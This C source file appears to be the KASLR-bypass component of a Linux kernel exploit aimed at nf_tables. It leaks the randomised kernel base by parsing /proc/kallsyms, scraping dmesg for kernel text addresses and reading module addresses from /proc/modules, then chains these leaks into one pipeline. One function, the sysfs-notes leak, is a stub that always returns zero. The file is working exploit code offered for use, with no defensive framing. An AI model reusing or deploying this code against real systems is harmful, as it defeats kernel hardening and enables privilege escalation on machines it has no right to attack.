#include "nfttables.h"
#include "arch.h"
#include "offsets.h"

/*
 * KASLR bypass techniques.
 *
 * Modern Linux randomizes the kernel text base on boot. To resolve
 * symbol addresses we need the actual base. Multiple leak sources
 * exist depending on kernel config and security policy.
 */

/* ── /proc/kallsyms ───────────────────────────────────────────── */

uint64_t kaslr_from_kallsyms(void)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;

    char line[256];
    uint64_t base = 0;

    while (fgets(line, sizeof(line), f)) {
        uint64_t addr;
        char type, sym[128];
        if (sscanf(line, "%lx %c %127s", &addr, &type, sym) != 3)
            continue;
        /* _text or _stext is the kernel text base */
        if (strcmp(sym, "_text") == 0 || strcmp(sym, "_stext") == 0) {
            base = addr;
            break;
        }
    }
    fclose(f);

    /* kptr_restrict=2 zeroes all addresses */
    if (base == 0 || base < KTEXT_BASE_DEFAULT)
        return 0;

    return base;
}

/* ── /sys/kernel/notes ────────────────────────────────────────── */

/*
 * The kernel build notes section is exposed at /sys/kernel/notes.
 * It contains ELF note entries with build info. On some kernels,
 * the file's own virtual address is embedded, leaking the KASLR slide.
 *
 * The trick: read the notes file, look for a GNU_BUILD_ID note.
 * The note's address in the kernel can be inferred from the mapping.
 * This works when /proc/kallsyms is restricted but /sys/kernel/notes
 * is readable (common default).
 */
uint64_t kaslr_from_sysfs_notes(void)
{
    /* read the file as raw bytes and look for the kernel .notes address.
       some kernels expose __start_notes in kallsyms even when other
       symbols are hidden */
    uint64_t notes_addr = kallsyms_lookup("__start_notes");
    if (notes_addr) {
        /* notes section is at a known offset from _text in each kernel
           build. without knowing the offset, we can still compute
           base = notes_addr - notes_section_offset. but we'd need to
           know notes_section_offset from the kernel image.

           fallback: if we have ANY kernel symbol, compute the slide
           from its known-default address. */
        return 0;
    }

    return 0;
}

/* ── dmesg leak ───────────────────────────────────────────────── */

/*
 * Kernel log (dmesg) sometimes contains kernel addresses from boot,
 * hardware initialization, or module loading. These survive even when
 * /proc/kallsyms is restricted (though dmesg_restrict may block this).
 */
uint64_t kaslr_from_dmesg(void)
{
    FILE *f = popen("dmesg 2>/dev/null", "r");
    if (!f) return 0;

    char line[512];
    uint64_t best = 0;

    while (fgets(line, sizeof(line), f)) {
        /* look for kernel text addresses (0xffffffff8XXXXXXX pattern) */
        char *p = line;
        while ((p = strstr(p, "0xffffffff8")) != NULL) {
            uint64_t addr;
            if (sscanf(p, "0x%lx", &addr) == 1) {
                /* kernel text is in 0xffffffff80000000 - 0xffffffffc0000000 */
                if (addr >= 0xffffffff80000000ULL &&
                    addr <  0xffffffffc0000000ULL) {
                    /* find the lowest address (closest to _text) */
                    uint64_t page_aligned = addr & ~0xFFFULL;
                    if (best == 0 || page_aligned < best)
                        best = page_aligned;
                }
            }
            p += 11;
        }
    }
    pclose(f);

    if (best == 0) return 0;

    /* round down to 2MB alignment (kernel text is PMD-aligned) */
    best &= ~(PMD_SZ - 1);

    pr_verb("dmesg leak: lowest kernel text addr ~0x%lx", best);
    return best;
}

/* ── /proc/modules ────────────────────────────────────────────── */

/*
 * Module base addresses are shown in /proc/modules. On some systems,
 * module addresses are visible even when kernel symbols are not.
 * We can compute the KASLR slide from known module-to-text offsets
 * for specific kernel builds.
 *
 * More practically: if we see the nf_tables module loaded, we know
 * our exploit is possible, and if we see any module address, we know
 * the modules region is randomized by the same slide as the text.
 */
uint64_t kaslr_from_modules(void)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return 0;

    char line[256];
    uint64_t mod_addr = 0;

    while (fgets(line, sizeof(line), f)) {
        char name[64];
        uint64_t size;
        int used;
        char deps[128];
        char state[16];
        uint64_t addr;

        if (sscanf(line, "%63s %lu %d %127s %15s 0x%lx",
                   name, &size, &used, deps, state, &addr) >= 6) {
            if (addr > 0 && addr >= MODULES_BASE_DEFAULT) {
                mod_addr = addr;
                pr_verb("module %s @ 0x%lx", name, addr);
                break;
            }
        }
    }
    fclose(f);

    /* can't directly convert module addr to kernel text base without
       knowing the specific kernel build's layout. but having any
       kernel-space address confirms KASLR slide. */
    return mod_addr;
}

/* ── combined leak pipeline ───────────────────────────────────── */

uint64_t kaslr_leak_base(void)
{
    uint64_t base;

    base = kaslr_from_kallsyms();
    if (base) {
        pr_verb("KASLR base from kallsyms: 0x%lx", base);
        return base;
    }

    base = kaslr_from_dmesg();
    if (base) {
        pr_verb("KASLR base from dmesg: 0x%lx", base);
        return base;
    }

    base = kaslr_from_modules();
    if (base) {
        pr_verb("module address from /proc/modules: 0x%lx (not text base)", base);
        /* this isn't the text base, but knowing any kernel addr helps */
    }

    base = kaslr_from_sysfs_notes();
    if (base) {
        pr_verb("KASLR base from sysfs notes: 0x%lx", base);
        return base;
    }

    return 0;
}
